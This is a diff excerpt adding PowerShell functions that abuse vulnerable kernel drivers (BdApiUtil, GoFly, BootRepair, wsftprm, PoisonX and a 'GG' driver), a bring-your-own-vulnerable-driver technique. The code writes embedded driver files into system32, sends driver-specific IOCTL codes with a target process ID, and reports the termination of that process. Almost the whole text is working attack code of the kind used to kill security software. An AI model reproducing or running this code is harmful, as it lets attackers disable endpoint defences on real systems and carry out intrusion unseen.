+                    $Status = $NtApi::DeviceIoControl($hDevice, $Profile.IoctlCode, $InOutPtr, 4, $InOutPtr, 4, $OutRet, [IntPtr]::Zero)
+                }
+
+            } elseif ($Profile.IoPattern -eq "GGSpecial") {
+
+                # https://github.com/The-Sword-of-Constantine/UsingBYOVD
+                
+                $CurrentPID   = [Int32][Marshal]::ReadIntPtr((NtCurrentTeb -ClientID))
+                $HandshakePtr = New-IntPtr -Size 4 -InitialValue ($CurrentPID -bxor 0x5A84)
+                $dwRead = [Marshal]::AllocHGlobal(4)
+                try {
+                    if (-not $NtApi::DeviceIoControl($hDevice, 0x223C14, $HandshakePtr, 4, [IntPtr]::Zero, 0, $dwRead, [IntPtr]::Zero)) {
+                        throw "GG Handshake Fail"
+                    }
+                } finally {
+                    Free-IntPtr $dwRead
+                    Free-IntPtr $HandshakePtr
+                }
+
+                $InOutPtr = New-IntPtr -Size $Profile.InputSize -InitialValue $ProcID
+                $OutRet   = New-IntPtr -Size 8
+                
+                $Status = $NtApi::DeviceIoControl($hDevice, $Profile.IoctlCode, $InOutPtr, $Profile.InputSize, [IntPtr]::Zero, 0, $OutRet, [IntPtr]::Zero)
+                
+                # Unload this crap
+                $UnloadPtr = New-IntPtr -Size 4 -InitialValue ($CurrentPID -bxor 0x5A84)
+                $dwRead    = [Marshal]::AllocHGlobal(4)
+                try {
+                    # Trigger clean internal unhooking (sub_14000D300)
+                    $NtApi::DeviceIoControl($hDevice, 0x223C1C, $UnloadPtr, 4, [IntPtr]::Zero, 0, $dwRead, [IntPtr]::Zero) | Out-Null
+                } finally {
+                    Free-IntPtr $dwRead
+                    Free-IntPtr $UnloadPtr
+                }
+
+            } elseif ($Profile.IoPattern -eq "EnPortvSpecial") {
+
+                # Allocating the full space needed (Header + Payload)
+                $InOutPtr = New-IntPtr -Size 16  
+                $OutRet   = New-IntPtr -Size 8
+
+                # Write your Process ID starting at byte offset 8
+                $cProcID = [marshal]::ReadInt64((NtCurrentTeb -ClientID))
+                [marshal]::WriteInt64($InOutPtr, 0, $cProcID)
+                [marshal]::WriteInt64($InOutPtr, 8, $ProcID)
+
+                # The function call expects the TOTAL size of the allocated buffer
+                $Status = $NtApi::DeviceIoControl(
+                    $hDevice, 
+                    2240632, 
+                    $InOutPtr, 16,
+                    [IntPtr]::Zero, 0,
+                    $OutRet, [IntPtr]::Zero
+                )
+
+            } elseif ($Profile.IoPattern -eq "DirectOut") {
+
+                $InOutPtr = New-IntPtr -Size $Profile.InputSize -InitialValue $ProcID
+                $OutRet   = New-IntPtr -Size $Profile.OutputSize # 8 bytes allocated
+
+                # Route OutRet into lpOutBuffer slot with nOutBufferSize explicitly set to 0
+                $pBytesReturned = New-IntPtr -Size 8
+                $Status = $NtApi::DeviceIoControl($hDevice, $Profile.IoctlCode, $InOutPtr, $Profile.InputSize, $OutRet, $Profile.OutputSize, $pBytesReturned, [IntPtr]::Zero)
+                Free-IntPtr $pBytesReturned
+
+            } else {
+
+                $InOutPtr = New-IntPtr -Size $Profile.InputSize -InitialValue $ProcID
+                $OutRet   = New-IntPtr -Size 8
+                
+                $Status = $NtApi::DeviceIoControl($hDevice, $Profile.IoctlCode, $InOutPtr, $Profile.InputSize, [IntPtr]::Zero, 0, $OutRet, [IntPtr]::Zero)
+            }
+
+            if ($Status) {
+                Write-Host "[SUCCESS] Terminated PID $ProcID via $($Profile.FileName)." -ForegroundColor Green
+                return
+            } else {
+                Write-Warning "DeviceIoControl signaling failed for driver: $DriverName"
+            }
+
+        } catch {
+            Write-Warning "Exception encountered: $_"
+        } finally {
+            if ($InOutPtr) { Free-IntPtr -handle $InOutPtr }
+            if ($OutRet)   { Free-IntPtr -handle $OutRet }
+            if ($hDevice)  { Free-IntPtr -handle $hDevice -Method NtHandle }
+            if ($Profile.RequiresSys) { Impersonate-Token -Revert }
+        }
+    }
+}
+Function Terminate-SystemProcess{
+    param (
+        [Int32]$ProcessID,
+        [ValidateSet("BdApiUtil", "bootrepair", "GoFly", "wsftprm", "PoisonX")]
+        [String]$DriverName
+    )
+
+    switch ($DriverName) {
+        "BdApiUtil"  { 
+            if (-not [File]::Exists("C:\windows\system32\BdApiUtil.sys")) {
+                Import-EmbeddedBlock -BlockName BdApiUtil -OutPath 'C:\windows\system32\BdApiUtil.sys' | Out-Null
+            }
+        }
+        "GoFly"      {
+            if (-not [File]::Exists("C:\windows\system32\GoFly64.sys")) {
+                Import-EmbeddedBlock -BlockName GoFly -OutPath 'C:\windows\system32\GoFly64.sys' | Out-Null
+            }
+        }
+        "bootrepair" {
+            if (-not [File]::Exists("C:\windows\system32\BootRepair.sys")) {
+                Import-EmbeddedBlock -BlockName BootRepair -OutPath 'C:\windows\system32\BootRepair.sys' | Out-Null
+            }
+        }
+        "wsftprm"    {
+            if (-not [File]::Exists("C:\windows\system32\wsftprm.sys")) {
+                Import-EmbeddedBlock -BlockName wsftprm -OutPath 'C:\windows\system32\wsftprm.sys' | Out-Null
+            }
+        }
+        "PoisonX"    {
+            if (-not [File]::Exists("C:\windows\system32\PoisonX.sys")) {
+                Import-EmbeddedBlock -BlockName PoisonX -OutPath 'C:\windows\system32\PoisonX.sys' | Out-Null
+            }
+        }
+    }
+
+    $IOCTL = 0x0
+    $OutBuffer = [IntPtr]::Zero
+    $OutBufferSize = 0x00
+
+    switch ($DriverName) {
+      "BdApiUtil"  { $IOCTL = 0x800024B4 }
+      "GoFly"      { $IOCTL =  0x12227A  }
+      "bootrepair" { $IOCTL =  0x222014  }
+      "wsftprm"    { $IOCTL =  0x22201C  }
+      "PoisonX"    { $IOCTL =  0x22E010  }
+    }
+
+    if ($DriverName -eq 'wsftprm') {
+        $DataSize = 0x40C
+        $DataPtr  = New-IntPtr -Size 0x40C -InitialValue $ProcessID
+        $Handle   = Get-FileHandle -FileName $DriverName -AlternativeName 'Warsaw_PM'
+    } elseif ($DriverName -eq 'PoisonX') {
+        $ProcessStr = $ProcessID.ToString()
+        $DataBytes  = [Encoding]::ASCII.GetBytes($ProcessStr)
+        # ~~~~~~~~~~~
+        $DataSize = 16
+        $DataPtr  = [Marshal]::AllocHGlobal(16)
+        0..1 | % {[Marshal]::WriteInt64($DataPtr, ($_*0x8), 0L)}
+        $CopyLength = [Math]::Min($DataBytes.Length, $DataSize - 1)
+        [Marshal]::Copy($DataBytes, 0, $DataPtr, $CopyLength)
+        # ~~~~~~~~~~~
+        $Handle   = Get-FileHandle -FileName 'PoisonX' -AlternativeName "{F8284233-48F4-4680-ADDD-F8284233}"
+        # ~~~~~~~~~~~
+        $OutBuffer = $DataPtr
+        $OutBufferSize = $DataSize
+    } elseif ($DriverName -eq 'GoFly') {
+        $DataSize = 0x04
+        $DataPtr  = New-IntPtr -Size 0x04 -InitialValue $ProcessID
+        $Handle   = Get-FileHandle -FileName 'GoFly64' -AlternativeName $DriverName
+    } else {
+        $DataSize = 0x04
+        $DataPtr  = New-IntPtr -Size 0x04 -InitialValue $ProcessID
+        $Handle   = Get-FileHandle -FileName $DriverName
+    }
+
+    try {
+        return (
+            $NtApi::DeviceIoControl(
+                $Handle,     $IOCTL,
+                $DataPtr,    $DataSize,
+                $OutBuffer,  $OutBufferSize,
+                [IntPtr]::Zero, 
+                [IntPtr]::Zero
+            )
+        )
+    }
+    finally {
+        Free-IntPtr $DataPtr
+        Free-IntPtr -handle $Handle -Method NtHandle
     }
 }
 #endregion
